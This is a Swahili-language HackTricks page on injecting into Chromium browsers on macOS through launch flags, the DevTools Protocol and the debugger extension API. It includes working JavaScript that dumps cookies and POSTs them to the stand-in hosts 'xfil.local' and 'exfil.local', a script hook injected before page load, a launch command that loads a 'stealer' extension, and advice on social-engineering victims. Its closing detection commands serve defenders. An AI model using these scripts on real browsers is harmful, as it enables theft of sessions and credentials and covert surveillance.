# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Vivinjari vinavyotegemea Chromium kama Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, na Opera vyote hutumia command-line switches, preference files, na DevTools automation interfaces zinazofanana. Kwenye macOS, mtumiaji yeyote mwenye GUI access anaweza kusitisha browser session iliyopo na kuifungua tena kwa flags, extensions, au DevTools endpoints holela zinazoendesha kwa entitlements za target.

#### Kuanzisha Chromium kwa custom flags kwenye macOS

macOS huhifadhi UI instance moja kwa kila Chromium profile, hivyo instrumentation kwa kawaida huhitaji kulazimisha browser kufungwa (kwa mfano kwa `osascript -e 'tell application "Google Chrome" to quit'`). Attackers kwa kawaida huifungua tena kupitia `open -na "Google Chrome" --args <flags>` ili ku-inject arguments bila kurekebisha app bundle. Kuweka command hiyo ndani ya user LaunchAgent (`~/Library/LaunchAgents/*.plist`) au login hook huhakikisha browser iliyochezewa inaanzishwa tena baada ya reboot/logoff.

#### `--load-extension` Flag

`--load-extension` flag hupakia kiotomatiki extensions ambazo hazijapakiwa (comma-separated paths). Iunganishe na `--disable-extensions-except` ili kuzuia extensions halali huku ukilazimisha payload yako pekee iendeshe. Malicious extensions zinaweza kuomba permissions zenye athari kubwa kama `debugger`, `webRequest`, na `cookies` ili kuingia kwenye DevTools protocols, kurekebisha CSP headers, kushusha kiwango cha HTTPS, au ku-exfiltrate session material mara tu browser inapoanza.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Switches hizi hufichua Chrome DevTools Protocol (CDP) kupitia TCP au pipe ili external tooling iweze kuendesha browser. Google ilibaini matumizi makubwa ya interface hii na infostealers na, kuanzia Chrome 136 (Machi 2025), switches hizi hupuuza default profile isipokuwa browser ianzishwe kwa `--user-data-dir` isiyo ya kawaida. Hii hulazimisha App-Bound Encryption kwenye profiles halisi, lakini attackers bado wanaweza kuanzisha profile mpya, kumshawishi victim a-authenticate ndani yake (phishing/triage assistance), na kuvuna cookies, tokens, device trust states, au WebAuthn registrations kupitia CDP.<sup>[5]</sup>

#### `--user-data-dir` Flag

Flag hii huelekeza browser profile nzima (History, Cookies, Login Data, Preference files, n.k.) kwenye path inayodhibitiwa na attacker. Ni ya lazima unapounganisha Chrome builds za kisasa na `--remote-debugging-port`, na pia hutenga tampered profile ili uweze kuweka `Preferences` au `Secure Preferences` files zilizoandaliwa mapema ambazo huzima security prompts, hu-install extensions kiotomatiki, na kubadilisha default schemes.

#### `--use-fake-ui-for-media-stream` Flag

Switch hii hupita camera/mic permission prompt ili page yoyote inayotumia `getUserMedia` ipate access mara moja. Iunganishe na flags kama `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, au CDP `Browser.grantPermissions` commands ili kunasa audio/video, kushiriki desktop, au kutimiza WebRTC permission checks bila user interaction.

## Delivery & Relaunch Patterns Zinazoonekana Kwenye Mashambulizi Halisi

CDP abuse kwa kawaida ni hatua ya **post-exploitation** badala ya initial payload. Campaign ya hivi karibuni ya macOS iliyolenga developers ilitumia Xcode **`Run Script` build phase** yenye sumu (`PBXShellScriptBuildPhase`) ili code itekelezwe victim alipofanya **build** ya project, si wakati alipo-clone au kuifungua tu. Baada ya execution hiyo ya kwanza, malware pia ili-infect miti mingine ya `.xcodeproj`, ikaongeza malicious Git `pre-commit` hooks, na kutafuta Xcode projects zaidi ndani ya ZIP archives.<sup>[3]</sup>

Kwa Chromium abuse, jambo hili ni muhimu kwa sababu attacker hahitaji ku-patch browser binary yenyewe. Build-phase / `osascript` stager ya muda mfupi inaweza badala yake kusakinisha **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher, n.k.) inayofungua tena browser halali kwa flags zinazodhibitiwa na attacker kila mara user anapoianzisha.<sup>[3]</sup>

> [!TIP]
> Kwenye developer endpoints, kagua `.pbxproj` files, `.git/hooks/pre-commit`, na ZIPs zilizo na `.xcodeproj` ukitafuta `curl`, `osascript`, `xxd`, `base64` iliyowekwa ndani mara nyingi, au logic ya kuanzisha tena Chrome isiyotarajiwa.

## Remote Debugging & DevTools Protocol Abuse

Mara Chrome inapofunguliwa tena kwa `--user-data-dir` maalum na `--remote-debugging-port`, unaweza kujiunga kupitia CDP (kwa mfano kupitia `chrome-remote-interface`, `puppeteer`, au `playwright`) na ku-script workflows zenye privileges kubwa:

- **Cookie/session theft:** `Network.getAllCookies` na `Storage.getCookies` hurudisha HttpOnly values hata wakati App-Bound encryption kwa kawaida ingezuia filesystem access, kwa sababu CDP huomba browser inayoendesha izi-decrypt.
- **Permission tampering:** `Browser.grantPermissions` na `Emulation.setGeolocationOverride` hukuruhusu kupita camera/mic prompts (hasa zikichanganywa na `--use-fake-ui-for-media-stream`) au kughushi location-based security checks.
- **Keystroke/script injection:** `Runtime.evaluate` hutekeleza JavaScript holela ndani ya active tab, kuwezesha credential lifting, DOM patching, au ku-inject persistence beacons zinazodumu baada ya navigation.<sup>[1]</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` na `Fetch.enable` hukatiza authenticated requests/responses kwa wakati halisi bila kugusa disk artifacts.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Kwa sababu Chrome 136 huzuia CDP kwenye profile chaguo-msingi, kunakili directory iliyopo ya mwathiriwa ya `~/Library/Application Support/Google/Chrome` hadi staging path hakutoi tena cookies zilizodecryptiwa. Badala yake, social-engineer mtumiaji ili athibitishe utambulisho ndani ya profile iliyowekewa instrumentation (kwa mfano, session ya msaada "ya kusaidia"), au capture MFA tokens zikiwa transit kupitia network hooks zinazodhibitiwa na CDP.<sup>[5]</sup>

### Mlolongo wa Backdoor wa mtindo wa XCSSET kupitia CDP

Muundo wa vitendo wa malware ni:

1. Anzisha upya userland implant au wrapper kila Chrome inapozinduliwa.
2. Zindua browser halali kwa `--remote-debugging-port=<port>` na, kwenye Chrome 136+, kwa kawaida pia `--user-data-dir=<dir>` isiyo ya chaguo-msingi iliyooanishwa.
3. Anzisha helper inayounganisha kwenye local CDP WebSocket na kusajili pre-document hook kwa `Page.addScriptToEvaluateOnNewDocument`.<sup>[2]</sup>

Helper hiyo inaweza kuingiza JavaScript **kabla** site code haijaendeshwa, jambo linalofaa kwa hooking `window.fetch`, `XMLHttpRequest`, wallet providers, au autofill flows bila kubadilisha files kwenye disk.<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Toleo lenye nguvu zaidi hubadilisha browser kuwa **host command bridge**: JavaScript iliyoingizwa hutoa `console.log` yenye delimiter, helper ya ndani hufuatilia `Runtime.consoleAPICalled`, huondoa marker, hutekeleza sehemu iliyobaki kupitia host shell (kwa mfano Go's `exec.Command`), na kurudisha stdout/stderr kupitia WebSocket ya mshambulizi. Hii huboresha utekelezaji wa script katika tab hadi kuwa **fileless reverse shell** kwa kiasi kikubwa.<sup>[3]</sup>

## Extension-Based Injection via Debugger API

Utafiti wa 2023 wa "Chrowned by an Extension" ulionyesha kwamba extension hasidi inayotumia API ya `chrome.debugger` inaweza kuambatanishwa na tab yoyote na kupata uwezo uleule wa DevTools kama `--remote-debugging-port`.<sup>[6]</sup> Hilo linavunja dhana za awali za isolation (extensions hubaki katika context zao) na kuwezesha:

- Wizi wa kimya wa cookies na credentials kwa kutumia `Network.getAllCookies`/`Fetch.getResponseBody`.
- Marekebisho ya site permissions (camera, microphone, geolocation) na bypass ya security interstitial, hivyo kuruhusu phishing pages kuiga dialogs za Chrome.
- Tampering ya on-path ya TLS warnings, downloads, au WebAuthn prompts kwa kuendesha programmatically `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, au `Security.handleCertificateError`.

Load extension kwa kutumia `--load-extension`/`--disable-extensions-except` ili user interaction isihitajike. Background script ndogo inayotumia API hii kwa madhara inaonekana hivi:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Extension pia inaweza kujiandikisha kupokea matukio ya `Debugger.paused` ili kusoma JavaScript variables, kurekebisha inline scripts, au kuweka custom breakpoints zinazoendelea baada ya navigation. Kwa kuwa kila kitu huendeshwa ndani ya GUI session ya mtumiaji, Gatekeeper na TCC hazichochewi, jambo linalofanya technique hii iwe bora kwa malware ambayo tayari imepata execution chini ya user context.<sup>[6]</sup>

## Ugunduzi na Utafutaji

- Toa alert kwa Chromium browsers zinazoanzishwa na `--remote-debugging-port`, `--remote-debugging-pipe`, au `--user-data-dir` inayotia shaka, hasa parent ikiwa ni `bash`, `sh`, `osascript`, `xcodebuild`, au LaunchAgent helper.
- Tafuta chains fupi ambapo helper hufungua local CDP WebSocket, inasajili `Page.addScriptToEvaluateOnNewDocument`, kisha hufanya outbound WebSocket/HTTPS connection ya muda mrefu.
- Fuatilia bridges za console-to-shell kwa kuoanisha shughuli za browser `Runtime.consoleAPICalled` na child shells au helper processes zinazotekeleza commands zilizotolewa na attacker.
- Kwenye developer Macs, kagua entries za `.pbxproj` `PBXShellScriptBuildPhase`, Git `pre-commit` hooks, Dock/login item relaunchers, na Xcode projects zilizomo ndani ya ZIP kwa browser wrapper installation.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Zana

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Huendesha kiotomatiki uzinduzi wa Chromium kwa payload extensions na hufichua CDP hooks shirikishi.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Tooling inayofanana, inayolenga traffic interception na browser instrumentation kwa waendeshaji wa macOS.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Maktaba ya Node.js ya ku-script Chrome DevTools Protocol dumps (cookies, DOM, permissions) pindi instance ya `--remote-debugging-port` inapokuwa live.

### Mfano
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pata mifano zaidi katika viungo vya tools.

## Marejeleo

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
